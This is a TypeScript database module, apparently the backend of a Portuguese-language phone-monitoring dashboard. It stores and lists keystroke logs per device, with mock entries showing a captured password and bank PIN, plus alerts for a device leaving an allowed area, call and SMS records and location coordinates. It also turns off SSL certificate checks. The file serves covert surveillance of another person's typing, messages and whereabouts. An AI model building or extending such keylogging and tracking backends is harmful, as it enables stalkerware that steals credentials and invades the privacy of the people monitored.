import { eq, and } from "drizzle-orm";
import { drizzle } from "drizzle-orm/mysql2";
import mysql from "mysql2/promise";
import type { Pool } from "mysql2/promise";
import { InsertUser, users, keylogs, InsertKeylog } from "../drizzle/schema";
import { ENV } from './_core/env';

let _db: any = null;

// Lazily create the drizzle instance so local tooling can run without a DB.
export async function getDb() {
  if (!_db && process.env.DATABASE_URL) {
    try {
      // Parse DATABASE_URL to extract connection details
      const url = new URL(process.env.DATABASE_URL);
      const pool = mysql.createPool({
        host: url.hostname,
        user: url.username,
        password: url.password,
        database: url.pathname.slice(1),
        port: url.port ? parseInt(url.port) : 3306,
        ssl: { rejectUnauthorized: false }, // Disable SSL verification for Railway
        waitForConnections: true,
        connectionLimit: 10,
        queueLimit: 0,
      });

      _db = drizzle(pool);
    } catch (error) {
      console.warn("[Database] Failed to connect:", error);
      _db = null;
    }
  }
  return _db;
}

export async function upsertUser(user: InsertUser): Promise<void> {
  if (!user.openId) {
    throw new Error("User openId is required for upsert");
  }

  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot upsert user: database not available");
    return;
  }

  try {
    const values: InsertUser = {
      openId: user.openId,
    };
    const updateSet: Record<string, unknown> = {};

    const textFields = ["name", "email", "loginMethod"] as const;
    type TextField = (typeof textFields)[number];

    const assignNullable = (field: TextField) => {
      const value = user[field];
      if (value === undefined) return;
      const normalized = value ?? null;
      values[field] = normalized;
      updateSet[field] = normalized;
    };

    textFields.forEach(assignNullable);

    if (user.lastSignedIn !== undefined) {
      values.lastSignedIn = user.lastSignedIn;
      updateSet.lastSignedIn = user.lastSignedIn;
    }
    if (user.role !== undefined) {
      values.role = user.role;
      updateSet.role = user.role;
    } else if (user.openId === ENV.ownerOpenId) {
      values.role = 'admin';
      updateSet.role = 'admin';
    }

    if (!values.lastSignedIn) {
      values.lastSignedIn = new Date();
    }

    if (Object.keys(updateSet).length === 0) {
      updateSet.lastSignedIn = new Date();
    }

    await db.insert(users).values(values).onDuplicateKeyUpdate({
      set: updateSet,
    });
  } catch (error) {
    console.error("[Database] Failed to upsert user:", error);
    throw error;
  }
}

export async function getUserByOpenId(openId: string) {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot get user: database not available");
    return undefined;
  }

  const result = await db.select().from(users).where(eq(users.openId, openId)).limit(1);

  return result.length > 0 ? result[0] : undefined;
}

export async function getUserById(id: number) {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot get user: database not available");
    return undefined;
  }

  const result = await db.select().from(users).where(eq(users.id, id)).limit(1);

  return result.length > 0 ? result[0] : undefined;
}

// Keylog helpers
export async function createKeylog(keylog: InsertKeylog): Promise<void> {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot create keylog: database not available");
    return;
  }

  try {
    await db.insert(keylogs).values(keylog);
  } catch (error) {
    console.error("[Database] Failed to create keylog:", error);
    throw error;
  }
}

// Mock data para alerts
const MOCK_ALERTS = [
  {
    id: 1,
    deviceId: "1",
    type: "offline",
    title: "Dispositivo Offline",
    message: "Dispositivo 1 ficou offline por mais de 5 minutos",
    severity: "high",
    createdAt: new Date(Date.now() - 1000 * 60 * 15),
    isRead: false,
  },
  {
    id: 2,
    deviceId: "2",
    type: "battery",
    title: "Bateria Baixa",
    message: "Dispositivo 2 com bateria abaixo de 10%",
    severity: "medium",
    createdAt: new Date(Date.now() - 1000 * 60 * 30),
    isRead: true,
  },
  {
    id: 3,
    deviceId: "3",
    type: "location",
    title: "Saiu da Área Permitida",
    message: "Dispositivo 3 saiu da área de monitoramento",
    severity: "high",
    createdAt: new Date(Date.now() - 1000 * 60 * 45),
    isRead: false,
  },
];

// Mock data para events
const MOCK_EVENTS = [
  {
    id: 1,
    deviceId: "1",
    type: "app_opened",
    title: "App Aberto",
    description: "WhatsApp foi aberto",
    createdAt: new Date(Date.now() - 1000 * 60 * 2),
  },
  {
    id: 2,
    deviceId: "1",
    type: "call_received",
    title: "Chamada Recebida",
    description: "Chamada de +55 11 98765-4321",
    createdAt: new Date(Date.now() - 1000 * 60 * 5),
  },
  {
    id: 3,
    deviceId: "1",
    type: "sms_received",
    title: "SMS Recebido",
    description: "Mensagem de +55 11 91234-5678",
    createdAt: new Date(Date.now() - 1000 * 60 * 10),
  },
  {
    id: 4,
    deviceId: "2",
    type: "app_opened",
    title: "App Aberto",
    description: "Instagram foi aberto",
    createdAt: new Date(Date.now() - 1000 * 60 * 3),
  },
  {
    id: 5,
    deviceId: "2",
    type: "location_updated",
    title: "Localização Atualizada",
    description: "Localização: -23.5505, -46.6333",
    createdAt: new Date(Date.now() - 1000 * 60 * 8),
  },
];

export async function getAlerts(deviceId?: string) {
  if (process.env.NODE_ENV !== 'production') {
    console.log("[Database] Development mode: using mock alerts");
    if (deviceId) {
      return MOCK_ALERTS.filter(a => a.deviceId === deviceId);
    }
    return MOCK_ALERTS;
  }
  return [];
}

export async function getEvents(deviceId?: string) {
  if (process.env.NODE_ENV !== 'production') {
    console.log("[Database] Development mode: using mock events");
    if (deviceId) {
      return MOCK_EVENTS.filter(e => e.deviceId === deviceId);
    }
    return MOCK_EVENTS;
  }
  return [];
}

export async function getKeylogsByDevice(deviceId: string) {
  // In development, always use mock data
  if (process.env.NODE_ENV !== 'production') {
    console.log("[Database] Development mode: using mock keylogs");
    // Mock data para desenvolvimento
    const mockKeylogs = [
      {
        id: 1,
        deviceId,
        userId: "user1",
        appName: "WhatsApp",
        keyText: "Oi, tudo bem?",
        createdAt: new Date(Date.now() - 1000 * 60 * 5),
        isDeleted: 0,
      },
      {
        id: 2,
        deviceId,
        userId: "user1",
        appName: "Gmail",
        keyText: "usuario@email.com",
        createdAt: new Date(Date.now() - 1000 * 60 * 10),
        isDeleted: 0,
      },
      {
        id: 3,
        deviceId,
        userId: "user1",
        appName: "WhatsApp",
        keyText: "Sim, e você?",
        createdAt: new Date(Date.now() - 1000 * 60 * 15),
        isDeleted: 0,
      },
      {
        id: 4,
        deviceId,
        userId: "user1",
        appName: "Instagram",
        keyText: "Que foto legal!",
        createdAt: new Date(Date.now() - 1000 * 60 * 20),
        isDeleted: 0,
      },
      {
        id: 5,
        deviceId,
        userId: "user1",
        appName: "Gmail",
        keyText: "senha123",
        createdAt: new Date(Date.now() - 1000 * 60 * 25),
        isDeleted: 0,
      },
      {
        id: 6,
        deviceId,
        userId: "user1",
        appName: "WhatsApp",
        keyText: "Reunião amanhã?",
        createdAt: new Date(Date.now() - 1000 * 60 * 30),
        isDeleted: 0,
      },
      {
        id: 7,
        deviceId,
        userId: "user1",
        appName: "Banco",
        keyText: "1234",
        createdAt: new Date(Date.now() - 1000 * 60 * 35),
        isDeleted: 0,
      },
      {
        id: 8,
        deviceId,
        userId: "user1",
        appName: "Chrome",
        keyText: "www.google.com",
        createdAt: new Date(Date.now() - 1000 * 60 * 40),
        isDeleted: 0,
      },
    ];
    return mockKeylogs;
  }

  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot get keylogs: database not available, returning empty");
    return [];
  }

  try {
    const result = await db
      .select()
      .from(keylogs)
      .where(and(eq(keylogs.deviceId, deviceId), eq(keylogs.isDeleted, 0)))
      .orderBy(keylogs.createdAt);
    return result;
  } catch (error) {
    console.error("[Database] Failed to get keylogs:", error);
    return [];
  }
}

export async function deleteKeylog(keylogId: number): Promise<void> {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot delete keylog: database not available");
    return;
  }

  try {
    await db
      .update(keylogs)
      .set({ isDeleted: 1 })
      .where(eq(keylogs.id, keylogId));
  } catch (error) {
    console.error("[Database] Failed to delete keylog:", error);
    throw error;
  }
}

export async function restoreKeylog(keylogId: number): Promise<void> {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot restore keylog: database not available");
    return;
  }

  try {
    await db
      .update(keylogs)
      .set({ isDeleted: 0 })
      .where(eq(keylogs.id, keylogId));
  } catch (error) {
    console.error("[Database] Failed to restore keylog:", error);
    throw error;
  }
}

export async function getDeletedKeylogs(deviceId: string) {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot get deleted keylogs: database not available");
    return [];
  }

  try {
    const result = await db
      .select()
      .from(keylogs)
      .where(and(eq(keylogs.deviceId, deviceId), eq(keylogs.isDeleted, 1)))
      .orderBy(keylogs.createdAt);
    return result;
  } catch (error) {
    console.error("[Database] Failed to get deleted keylogs:", error);
    return [];
  }
}

// TODO: add feature queries here as your schema grows.
